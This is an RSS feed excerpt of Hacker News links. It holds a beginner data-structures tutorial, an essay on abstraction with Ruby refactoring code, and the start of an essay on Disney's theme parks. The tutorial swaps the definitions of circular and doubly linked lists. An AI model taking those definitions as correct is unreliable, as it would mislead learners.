            <link>https://alchemist.camp/little-potions/hello-world</link>
            <guid isPermaLink="false">hacker-news-small-sites-25183869</guid>
            <pubDate>Mon, 23 Nov 2020 05:30:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data structures: The linear non-primitives]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25183818">thread link</a>) | @Marv101
<br/>
November 22, 2020 | https://thegreencodes.com/data-structures-the-linear-non-primitives | <a href="https://web.archive.org/web/*/https://thegreencodes.com/data-structures-the-linear-non-primitives">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>On our first set of data structures, we get into the definition and scope of non-primitive structures. Have a look at the previous read on  <a target="_blank" href="https://thegreencodes.com/the-power-of-data-structures">The Power of Data structures</a> in case you feel a little lost. Right off the batt, we define what it means to be a non-primitive set, and how this can be further broken down.</p>
<p>Let's get right into it. A non-primitive structure is what happens when you combine two or more primitives. What we mean is simple. A <code>char</code> and  <code>int</code> , for instance,  are primitives. The simplest representations of data. </p>
<p>Broadly speaking, linear non-primitives can be grouped further as below:</p>
<h2 id="linear-non-primitives">Linear non-primitives</h2>
<ul>
<li>Stacks</li>
<li>Queues</li>
<li>LInked lists</li>
<li>Arrays</li>
</ul>
<p>Here, as stated before, data is sequential - one after another. Some of these structures might <a target="_blank" href="https://thegreencodes.com/memory-management-deep-and-shallow-copying">ring a bell</a>, stackify, is that you?. </p>
<h3 id="arrays">Arrays</h3>
<p>These are what we call stores of homogenous (meaning similar) data. So one might have an array like this:</p>
<pre><code><span>my_array</span> = [<span>1</span>,<span>2</span>,<span>3</span>,<span>4</span>,<span>5</span>,<span>6</span>,<span>7</span>,<span>8</span>,<span>9</span>] 

<span>vowels</span> = [<span>' a'</span>, <span>'e'</span>, <span>'i'</span> , <span>'o'</span>, <span>'u'</span> ] 
</code></pre><p>Note how <code>my_array</code> has only integers while <em>vowels</em> has <em>char</em>. In both instances, our array has a collection of primitives - <strong>one type of primitive per array</strong>. </p>
<p>Arrays are of a fixed size. Once declared, the computer knows the amount of memory reserved for items to be stored there.  You might ask:</p>
<p><em>"But what if the type of data I have changes in size greater than the array?" </em></p>
<p>Well, you might need to consider a different type of structure to store this data. 
Use arrays, for instance, to store months of the year. We will not be changing this count anytime.</p>
<p>Above declared, the sizes of the arrays are inferred. Meaning the types, since not defined per se, are  'figured out' based on the values and how we use them.</p>
<p>We might as well have this:</p>
<p>For python.</p>
<pre><code>
<span>import</span> array

count_down = array.array(<span>'i'</span>, [<span>5</span>,<span>4</span>,<span>3</span>,<span>2</span>,<span>1</span>])


</code></pre>
<p>Types may go on as:</p>
<p><code>c</code> for <em>char</em>
<code>f</code> for <em>float</em>
<code>d</code> for <em>double</em>
<code>u</code> for <em>unicode</em> and so forth.</p>
<p>Have a look at the <a target="_blank" href="https://docs.python.org/3/library/array.html?highlight=arrays">documentation</a> for more insight into this. AS well, take note that the <code>array module</code> has different functions to enable array manipulation.</p>
<p>Rust:</p>
<pre><code>
<span>let</span> count_down: [<span>i32</span>; <span>5</span>] = [<span>5</span>,<span>4</span>,<span>3</span>,<span>2</span>,<span>1</span>];


</code></pre>
<blockquote>
<p>Important pointer:
    Python lists and arrays are not the same!</p>
</blockquote>
<p>Operations on an array will be based on the <code>index</code> of the array element, with indexing starting from <em>0</em>. Hence, the first item, in either case, would be:</p>
<pre><code><span>count_down</span><span>[0]</span>
</code></pre><p>The result from the above is 5 (the semi-colon has been left out for brevity but should be used based on the language you are using).</p>
<p>Let's take a look at another structure that looks similar, but is not the same - <strong>Linked lists</strong>.</p>
<h3 id="linked-lists">Linked lists</h3>
<p>Unlike arrays, linked lists store data in a non-contiguous form. This implies one piece of data is not placed side by side to the other as: <code>[1,2,3,4,5]</code>, rather it is stored in form of nodes with pointers to the next as so:</p>
<pre><code>
<span>[data1, pointer_to_data2]</span> ...  <span>[data1, pointer_to_data3]</span> ... <span>and</span> <span>so</span> <span>on</span>
</code></pre><p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605257211148/M0hJg9a9v.png?auto=format&amp;q=60" alt="linked_list.png"></p>
<p>The last item in our linked list, since there is no pointer to the next, would have <code>null</code>. </p>
<p>As well, linked lists are dynamic-  their size is not fixed at initialization. </p>
<p>Linked lists will be further broken to:</p>
<p>a) Singular linked lists (used in the elaboration of linked lists above)</p>
<p>b) Circular linked lists</p>
<p>c) Doubly linked lists</p>
<h4 id="circular-linked-lists">Circular linked lists</h4>
<p>These have three items in a node: the previous data, the data, and finally, the next data in the sequence.</p>
<pre><code><span>[null, data1, pointer_to_data2]</span> ...  <span>[pointer_to_data_1 ,data1, pointer_to_data3]</span>
</code></pre><p>The first item (the head), has a <code>null</code> as the previous pointer while the last node has <code>null</code> on the next pointer.</p>
<h4 id="doubly-linked-lists">Doubly linked lists</h4>
<p>Similar to circular linked lists, these have two pointers as well. The only difference would be the last node, instead of a <code>null</code>, has a pointer back to the first item in the list. 1 + 1 = circular.</p>
<p>In most of what we implement through code, we have implementations of linked lists. You will hardly get yourself doing this manually, but understanding that some of the things we call 'mutable arrays ' are actually implementations or wrappers around more complex structures.</p>
<p><strong>Example:</strong>
If navigating through my directory, my computer needs to know where I am, where I'm from, and possibly have the correct link/structure to the nested directory I'm navigating to. So to the top-level directory, I cannot go any higher, no previous node. Likewise to the last directory or file, there is no 'next' option.</p>
<p>Till now, we have come to understand the importance of data structures, the groups they have been placed into, and we have an idea of what some of the linear data structures involved. We could go on and on on the details of each, but that is a tale for another day. A breather for us both at this point.  Go read something non-algorithm-like for a moment. We'll still meet here, same time,  same drive. </p>
</div></div>]]>
            </description>
            <link>https://thegreencodes.com/data-structures-the-linear-non-primitives</link>
            <guid isPermaLink="false">hacker-news-small-sites-25183818</guid>
            <pubDate>Mon, 23 Nov 2020 05:17:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Abstraction and Essential Complexity]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25183660">thread link</a>) | @jimchao
<br/>
November 22, 2020 | http://neethack.com/2020/10/Abstraction-and-essential-complexity/ | <a href="https://web.archive.org/web/*/http://neethack.com/2020/10/Abstraction-and-essential-complexity/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
  <article>
    <span>
      <time datetime="2020-10-04T18:50:20.000Z" itemprop="datePublished">
          2020-10-04
      </time>
    
    
    | 
    <a href="http://neethack.com/tags/programming/">programming</a>
    
    
</span>
    
    <section>
      <p><img src="http://neethack.com/2020/10/Abstraction-and-essential-complexity/top.png" alt="cover image"></p>
<blockquote>
<p>TLDR: Inline abstractions and simplify logic to write better code.</p>
</blockquote>
<p>Programmer’s work today is based on different levels of abstractions in the form of APIs and modules, they hide large amounts of implementation details so we can build features and products without understanding every detail. However, abstractions also increase the complexity of our code. Lots of time I struggle with overly complex code and try to fix those pieces by removing unnecessary abstractions. But how can we tell the abstraction is good or bad? How much abstraction in the code is too much? This article will be focusing on some of my views about abstraction and complexity in programming.</p>
<h2 id="Power-of-abstraction"><a href="#Power-of-abstraction" title="Power of abstraction"></a>Power of abstraction</h2><p>Abstraction is the building block of programmer today, it free programmer from massive details of complexity, without it we will still be writing machine code, for examples: </p>
<ul>
<li>Python and Ruby is an abstraction layer running on C interpreter</li>
<li>C is a layer on instruction set.</li>
<li>Rails provide multiple abstraction layers like MVC (model-view-controller), ORM (ActiveRecord, object-relation mapping)</li>
<li>React hide DOM updates into declarative components and state.</li>
</ul>
<p>In those examples, the abstractions provide a huge benefit by encapsulating details and provide a high level syntax or API to let people understand and use it.</p>
<h2 id="Essential-and-accidental-complexity"><a href="#Essential-and-accidental-complexity" title="Essential and accidental complexity"></a>Essential and accidental complexity</h2><p>Although abstraction is a really powerful tool, it also has its limitation.</p>
<p>In the paper “<a href="http://worrydream.com/refs/Brooks-NoSilverBullet.pdf" target="_blank" rel="noopener">No Silver Bullet</a>“, it defines the software complexity into 2 parts. Essential complexity and accidental complexity.</p>
<p>Essential complexity is the complexity inherent from the problem domain. Including the mutation of state, condition, the order of procedure, and messaging. All other complexities from the language, framework, or stack are accidental. The line between those 2 complexities might vary, but basically, you can solve the problem with different languages, different software, but the essential - the algorithm and logic to solve the problem - can not be reduced. For example, you can write the quicksort in C, python, Haskell, or even pseudo-code. The essential complexity of quicksort still stays the same. Therefore no matter how much the technology of tooling improves, there is still no silver bullet to solve the essential complexity issue to increase the productivity of programmers.</p>
<h2 id="Problem-of-abstraction"><a href="#Problem-of-abstraction" title="Problem of abstraction"></a>Problem of abstraction</h2><p>Abstraction is a useful tool to reduce accidental complexity, but it also has several drawbacks:</p>
<ol>
<li>It can not reduce essential complexity. </li>
</ol>
<p>Although abstraction can largely reduce accidental complexity, make the code closer to the problem domain by providing higher-level syntax and API. However, the problem domain still inherits the complexity from the real world. Abstraction can not make it simpler. </p>
<ol start="2">
<li>It increases accidental complexity.</li>
</ol>
<p>This is a tricky part because abstraction is not essential for solving the problem. Any extra abstractions are increasing accidental complexity. But then how the abstraction decrease complexity? By enough usage of it. A higher-level abstraction can represent multiple lower-level concept together. So with more usage, it can encapsulate more details and make the code focus on essential complexity but not accidental. So with the growth of the problem domain, the complexity with abstraction will grow like this: <img src="http://neethack.com/2020/10/Abstraction-and-essential-complexity/pic1.png" alt="pic1">. </p>
<p>At the beginning of the graph, it will increase more complexity. For example, we can create the acronym “ECAC” to represent those 2 types of complexity. If I only use this acronym once in this post, it only makes this more complicated because the acronym is not essential. However, if this article got widely accepted, we might be able to call our colleague “you should look at the ECAC for your code” Then it make the conversation simpler.</p>
<ol start="3">
<li>It might be wrong or misleading.</li>
</ol>
<p>Abstractions are not essential, so in the worst case, it might not be correct and misleading. This graph shows how complexity grows with wrong abstractions. <img src="http://neethack.com/2020/10/Abstraction-and-essential-complexity/pic2.png" alt="pic2"></p>
<p>If an abstraction does not have enough usage to cover the extra complexity introduced. It only makes to code more complicated. Or the abstraction might not be able to successfully hide lower-level details, and users even have to bypass the abstraction. Both of those cases make the abstraction increasing accidental complexity rather than decrease it.</p>
<h2 id="Reduce-complexity"><a href="#Reduce-complexity" title="Reduce complexity"></a>Reduce complexity</h2><p>Then how can we properly reduce the complexity of our code? Here’s are a couple of suggestions:</p>
<ol>
<li>Make reducing essential complexity the priority</li>
</ol>
<p>Because unlike abstractions, a better algorithm is basically, better.</p>
<p>The way I use to estimate is by inline most of the abstractions in our problem domain to see procedures, conditions, messaging, and state mutations. And try to make those steps simpler, like removing redundant steps, changing the order to remove conditions, and remove unnecessary states. </p>
<ol start="2">
<li>Always evaluate multiple solutions</li>
</ol>
<p>Sometimes it is really hard to evaluate the changes are worth it or not, Therefore evaluate multiple solutions is a good guideline. We can find what is essential in different solutions, And follow Occam’s Razor principle: the simplest solution usually is the best solution.</p>
<ol start="3">
<li>Reorganize, inline, and rename code</li>
</ol>
<p>With those methods we can reduce extra abstractions and reduce accidental complexity, Also help you understand the logic and find a better algorithm.</p>
<ol start="4">
<li>Rule of three</li>
</ol>
<p>A basic rule to introduce abstraction is to wait until you have 3 usages. It might vary but that is the least case for the abstraction to be useful.</p>
<h2 id="Example"><a href="#Example" title="Example"></a>Example</h2><p>Here I am going to reuse the example in Sandi Matz’s talk: <a href="https://youtu.be/XXi_FBrZQiU" target="_blank" rel="noopener">Polly want a message</a>, In this talk, Sandi explains how object-oriented and abstraction can simplify a project that read a file and print line numbers, here is the source:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br></pre></td><td><pre><span><span><span>class</span> <span>Listing</span></span></span><br><span>  <span>attr_reader</span> <span>:filename</span>, <span>:line_numbers</span>, <span>:left_just</span>, <span>:repository</span>, <span>:tag</span>, <span>:git</span></span><br><span></span><br><span>  <span><span>def</span> <span>initialize</span><span>(<span>filename:</span>, <span>line_numbers:</span> <span>nil</span>, <span>left_just:</span> <span>nil</span>, <span>repository:</span> <span>nil</span>, <span>tag:</span> <span>nil</span>, <span>git_cmd:</span> <span>nil</span>)</span></span></span><br><span>    @filename = filename</span><br><span>    @line_numbers = line_numbers</span><br><span>    @repository = repository</span><br><span>    @left_just = left_just</span><br><span>    @tag = tag</span><br><span>    @git_cmd = git_cmd</span><br><span>  <span>end</span></span><br><span></span><br><span>  <span><span>def</span> <span>lines</span></span></span><br><span>    all_lines = <span>if</span> git_cmd</span><br><span>                  git_lines</span><br><span>                <span>else</span></span><br><span>                  file_lines</span><br><span>                <span>end</span></span><br><span></span><br><span>    subset = <span>if</span> line_numbers</span><br><span>               lines_to_print(all_lines)</span><br><span>             <span>else</span></span><br><span>               all_lines</span><br><span>             <span>end</span></span><br><span></span><br><span>    <span>if</span> left_just</span><br><span>      <span>return</span> justify(subset)</span><br><span>    <span>end</span></span><br><span></span><br><span>    subset</span><br><span>  <span>end</span></span><br><span></span><br><span>  private</span><br><span>  <span><span>def</span> <span>git_lines</span></span></span><br><span>    git_cmd.repository = repository</span><br><span>    git_cmd.tagname = tag</span><br><span>    git_cmd.filename = filename</span><br><span>    git_cmd.show.split(<span>"\n"</span>)</span><br><span>  <span>end</span></span><br><span></span><br><span>  <span><span>def</span> <span>file_lines</span></span></span><br><span>    File.read(filename).split(<span>"\n"</span>)</span><br><span>  <span>end</span></span><br><span></span><br><span>  <span><span>def</span> <span>lines_to_print</span><span>(all_lines)</span></span></span><br><span>    specs = line_numbers.gsub(<span>/['|']/</span>, <span>''</span>).gsub(<span>/ /</span>, <span>''</span>).split(<span>','</span>)</span><br><span>    specs.collect <span>do</span> <span>|spec|</span></span><br><span>      <span>if</span> spec.<span>include</span>?(<span>'#'</span>)</span><br><span>        num_spaces = spec.delete(<span>'#'</span>).to_i</span><br><span>        (<span>' '</span> * num_spaces) + <span>'# ...'</span></span><br><span>      <span>else</span></span><br><span>        edges = spec.split(<span>'-'</span>).collect(&amp;<span>:to_i</span>)</span><br><span>        individual_numbers = (edges.min.to_i..edges.max.to_i).to_a</span><br><span>        individual_numbers.collect { <span>|i|</span> all_lines[i - <span>1</span>] }.compact</span><br><span>      <span>end</span></span><br><span>    <span>end</span>.flatten.compact</span><br><span>  <span>end</span></span><br><span></span><br><span>  <span><span>def</span> <span>justify</span><span>(lines)</span></span></span><br><span>    lines.map { <span>|line|</span> line.slice(num_leading_space_to_remove(lines)..-<span>1</span>) <span>||</span> <span>''</span> }</span><br><span>  <span>end</span></span><br><span></span><br><span>  <span><span>def</span> <span>num_leading_space_to_remove</span><span>(lines)</span></span></span><br><span>    @num <span>||</span>= </span><br><span>      lines.reduce(<span>999_999</span>) { <span>|current_min, line|</span></span><br><span>        line.empty? ? current_min : [current_min, num_leading_spaces(line)].min</span><br><span>      }</span><br><span>  <span>end</span></span><br><span></span><br><span>  <span><span>def</span> <span>num_leading_spaces</span><span>(line)</span></span></span><br><span>    line[<span>/\A */</span>].size</span><br><span>  <span>end</span></span><br><span><span>end</span></span><br><span></span><br><span><span><span>class</span> <span>GitCmd</span></span></span><br><span>  <span>attr_accessor</span> <span>:repository</span>, <span>:tagname</span>, <span>:filename</span></span><br><span></span><br><span>  <span><span>def</span> <span>show</span></span></span><br><span>    <span>`git <span>#{git_dir}</span> show <span>#{tagname}</span>:<span>#{filename}</span>`</span></span><br><span>  <span>end</span></span><br><span></span><br><span>  private</span><br><span>  <span><span>def</span> <span>git_dir</span></span></span><br><span>    <span>%(--git-dir="<span>#{repository}</span>")</span></span><br><span>  <span>end</span></span><br><span><span>end</span></span><br></pre></td></tr></tbody></table></figure>
<p>And Sandi shows how to use object-oriented to refactored previous source, I will ignore the progress and only show result here. It is to better follow the talk for details:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br><span>112</span><br><span>113</span><br><span>114</span><br><span>115</span><br><span>116</span><br><span>117</span><br><span>118</span><br><span>119</span><br><span>120</span><br><span>121</span><br><span>122</span><br><span>123</span><br><span>124</span><br><span>125</span><br><span>126</span><br><span>127</span><br><span>128</span><br><span>129</span><br><span>130</span><br><span>131</span><br><span>132</span><br><span>133</span><br><span>134</span><br><span>135</span><br><span>136</span><br><span>137</span><br><span>138</span><br><span>139</span><br><span>140</span><br><span>141</span><br><span>142</span><br><span>143</span><br><span>144</span><br><span>145</span><br><span>146</span><br><span>147</span><br><span>148</span><br><span>149</span><br><span>150</span><br><span>151</span><br><span>152</span><br><span>153</span><br><span>154</span><br><span>155</span><br><span>156</span><br></pre></td><td><pre><span><span><span>class</span> <span>Listing</span></span></span><br><span>  <span>attr_reader</span> <span>:source</span>, <span>:subsetter</span>, <span>:justifier</span></span><br><span></span><br><span>  <span><span>def</span> <span>initialize</span><span>(<span>source:</span>, <span>subsetter:</span>, <span>justifier:</span>)</span></span></span><br><span>    @source = source</span><br><span>    @subsetter = subsetter</span><br><span>    @justifier = justifier</span><br><span>  <span>end</span></span><br><span></span><br><span>  <span><span>def</span> <span>lines</span></span></span><br><span>    justifier.justify(subsetter.lines(source.lines))</span><br><span>  <span>end</span></span><br><span><span>end</span></span><br><span></span><br><span><span><span>module</span> <span>Source</span></span></span><br><span>  <span><span>class</span> <span>File</span></span></span><br><span>    <span>attr_reader</span> <span>:filename</span></span><br><span></span><br><span>    <span><span>def</span> <span>initialize</span><span>(<span>filename:</span>)</span></span></span><br><span>      @filename = filename</span><br><span>    <span>end</span></span><br><span></span><br><span>    <span><span>def</span> <span>lines</span></span></span><br><span>      <span>:</span><span>:File</span>.read(filename).split(<span>"\n"</span>)</span><br><span>    <span>end</span></span><br><span>  <span>end</span></span><br><span></span><br><span>  <span><span>class</span> <span>GitTag</span></span></span><br><span>    <span><span>def</span> <span>self</span>.<span>git_cmd</span></span></span><br><span>      GitCmd.new</span><br><span>    <span>end</span></span><br><span></span><br><span>    <span>attr_reader</span> <span>:filename</span>, <span>:tagname</span>, <span>:repository</span>, <span>:git_cmd</span></span><br><span></span><br><span>    <span><span>def</span> <span>initialize</span><span>(<span>filename:</span>, <span>repository:</span>, <span>tag:</span>, <span>git_cmd:</span> <span>self</span><span>.<span>class</span>.<span>git_cmd</span>)</span></span></span></span><br><span><span><span>      @git_cmd = git_cmd</span></span></span><br><span><span><span>      git_cmd.repository = repository</span></span></span><br><span><span><span>      git_cmd.tagname = tag</span></span></span><br><span><span><span>      git_cmd.filename = filename</span></span></span><br><span><span><span>    <span>end</span></span></span></span><br><span><span><span></span></span></span><br><span><span><span>    <span><span>def</span> <span>lines</span></span></span></span></span><br><span><span><span>      git_cmd.show.split(<span>"\n"</span>)</span></span></span><br><span>    <span>end</span></span><br><span>  <span>end</span></span><br><span></span><br><span>  <span><span>class</span> <span>GitCmd</span></span></span><br><span>    <span>attr_accessor</span> <span>:repository</span>, <span>:tagname</span>, <span>:filename</span></span><br><span></span><br><span>    <span><span>def</span> <span>show</span></span></span><br><span>      <span>`git <span>#{git_dir}</span> show <span>#{tagname}</span>:<span>#{filename}</span>`</span></span><br><span>    <span>end</span></span><br><span></span><br><span>    <span><span>def</span> <span>git_dir</span></span></span><br><span>      <span>%Q[--git-dir="<span>#{repository}</span>"]</span></span><br><span>    <span>end</span></span><br><span>  <span>end</span></span><br><span><span>end</span></span><br><span></span><br><span><span><span>module</span> <span>Subset</span></span></span><br><span>  <span><span>class</span> <span>Everything</span></span></span><br><span>    <span><span>def</span> <span>lines</span><span>(everything)</span></span></span><br><span>      everything</span><br><span>    <span>end</span></span><br><span>  <span>end</span></span><br><span>  <span><span>class</span> <span>LineNumber</span></span></span><br><span>    <span>attr_reader</span> <span>:line_numbers</span></span><br><span>    <span><span>def</span> <span>initialize</span><span>(<span>line_numbers:</span>)</span></span></span><br><span>      @line_numbers = line_numbers</span><br><span>    <span>end</span></span><br><span></span><br><span>    <span><span>def</span> <span>lines</span><span>(possibilities)</span></span></span><br><span>      clump_specs.collect { <span>|spec|</span> clump_for(spec, possibilities) }.flatten.compact</span><br><span>    <span>end</span></span><br><span></span><br><span>    <span><span>def</span> <span>clump_specs</span></span></span><br><span>      line_numbers.gsub(<span>/['|']/</span>, <span>''</span>).gsub(<span>/ /</span>, <span>''</span>).split(<span>','</span>)</span><br><span>    <span>end</span></span><br><span></span><br><span>    <span><span>def</span> <span>clump_for</span><span>(spec, possibilities)</span></span></span><br><span>      Clump.lines(<span>spec:</span> spec, <span>possibilties:</span> possibilities)</span><br><span>    <span>end</span></span><br><span>  <span>end</span></span><br><span><span>end</span></span><br><span></span><br><span><span><span>class</span> <span>Clump</span></span></span><br><span>  <span><span>def</span> <span>self</span>.<span>lines</span><span>(<span>spec:</span>, <span>possibilities:</span> [])</span></span></span><br><span>    <span>self</span>.<span>for</span>(<span>spec:</span> spec, <span>possibilities:</span>…</span></pre></td></tr></tbody></table></figure></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://neethack.com/2020/10/Abstraction-and-essential-complexity/">http://neethack.com/2020/10/Abstraction-and-essential-complexity/</a></em></p>]]>
            </description>
            <link>http://neethack.com/2020/10/Abstraction-and-essential-complexity/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25183660</guid>
            <pubDate>Mon, 23 Nov 2020 04:41:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Digital Theme Park Platforms: The Most Important Media Businesses of the Future]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25183488">thread link</a>) | @Kinrany
<br/>
November 22, 2020 | https://www.matthewball.vc/all/digitalthemeparkplatforms | <a href="https://web.archive.org/web/*/https://www.matthewball.vc/all/digitalthemeparkplatforms">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page" role="main">
        
          <article data-page-sections="5d8e94500fa50d2aaaa7c406" id="sections">
  
    <section data-section-id="5d8e94500fa50d2aaaa7c408" data-controller="SectionWrapperController, MagicPaddingController" data-current-styles="{
&quot;imageOverlayOpacity&quot;: 0.15,
&quot;video&quot;: {
&quot;playbackSpeed&quot;: 0.5,
&quot;filter&quot;: 1,
&quot;filterStrength&quot;: 0,
&quot;zoom&quot;: 0
},
&quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
&quot;sectionHeight&quot;: &quot;section-height--medium&quot;,
&quot;customSectionHeight&quot;: 10,
&quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
&quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
&quot;contentWidth&quot;: &quot;content-width--wide&quot;,
&quot;customContentWidth&quot;: 50,
&quot;sectionTheme&quot;: &quot;&quot;,
&quot;sectionAnimation&quot;: &quot;none&quot;,
&quot;backgroundMode&quot;: &quot;image&quot;
}" data-animation="none">
  
  <div>
    <div>
      
      
      
      <div data-content-field="main-content" data-item-id="">
  <article id="article-">
  
    <div>
      

      <div>
        <div><div data-layout-label="Post Body" data-type="item" id="item-5e644cbd1f4bbe1201cae5d2"><div><div><div data-block-type="5" id="block-509f2b77bcb05cb3a13e"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5d8e9007bc3d0e18a4c49673/1583631643226-40206LFTFFRWCM9H2G48/ke17ZwdGBToddI8pDm48kFTEgwhRQcX9r3XtU0e50sUUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcW7uEhC96WQdj-SwE5EpM0lAopPba9ZX3O0oeNTVSRxdHAmtcci_6bmVLoSDQq_pb/maxresdefault.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5d8e9007bc3d0e18a4c49673/1583631643226-40206LFTFFRWCM9H2G48/ke17ZwdGBToddI8pDm48kFTEgwhRQcX9r3XtU0e50sUUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcW7uEhC96WQdj-SwE5EpM0lAopPba9ZX3O0oeNTVSRxdHAmtcci_6bmVLoSDQq_pb/maxresdefault.jpg" data-image-dimensions="1280x720" data-image-focal-point="0.5,0.5" alt="maxresdefault.jpg" data-load="false" data-image-id="5e644d1bad7cab40b9b19f03" data-type="image" src="https://www.matthewball.vc/all/maxresdefault.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-83d26a75802dd2ca90d0"><div><p><span><strong><em>Chapter One: The Past </em></strong></span></p><p>Disney is the envy of every media company, regardless of whether it focuses on film, TV, gaming, music or publishing. In plain terms, there has never been a more dominant entertainment company, globally or in the US. It has a brand that actually matters to consumers, owns franchises that consumers essentially treat like subscription content services, and operates the biggest star-making platforms in the world. And as strong as this platform was at the start of 2019, it exited the year even stronger. In a matter of weeks, Disney’s brand new direct-to-consumer platform acquired 30MM subscribers.</p><p>The deeper we get into the digital era, the more dominant Disney seems to become. After all, it was long expected that the Internet would disrupt dominant media companies and IP via rights infringement and the emergence of myriad user-generated “franchises”. However, one of the biggest storytelling “lessons” in the 20th and early 21th century was that audiences have an unending desire for “more” of the stories they <em>already </em>love. And the Internet has enabled this to an unprecedented degree. You can constantly track production (cast Instagrams, behind-the-scenes featurettes, and leaks on social media), engage in fan communities (message boards and YouTube theory/Easter egg videos), consume endless amounts of fan content (e.g. fanfic and watch-along podcasts), play this content back on demand (e.g. Netflix), and engage in never-ending and constantly updated online multiplayer games (e.g. Star Wars: Battlefront 2). This is a powerful, self-sustaining financial and cultural flywheel. And Disney has many of the franchises that best lend themselves to this model. Many of those they don’t own, such as <em>Harry Potter</em>, have their rights fragmented.</p><p>But what is the strongest, most profitable, most defensible part of Disney’s business in the digital era? Its capex-heavy, physical theme parks.</p><p>There is no simple way to quantify how important this business unit is to Disney. The financial role is obvious. Disney’s Parks &amp; Attractions segment generates nearly 100% more revenue and 60% more profit than Disney’s studio division (which already generates nearly three times the revenue AND three times the gross <em>margins </em>as its primary competitors). By turning hit films into theme park attractions, not only does Disney generate more “upside” from a hit than its competitors do, Disney’s breakeven point for these films is also much lower. But the parks are much more than this direct financial benefit. There is nothing that can compare to the impact of a child being hugged by her heroes. The ability to enjoy your favorite IP as “you” is unique and lasts a lifetime. Consider, for example, how many families have Disneyland photos of their kids with Mickey or Woody on the fridge. Or how many of these kids have kept those photos decades later (and compared them to their eventual spouse’s version of that same photo).</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1583704876360_17902"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
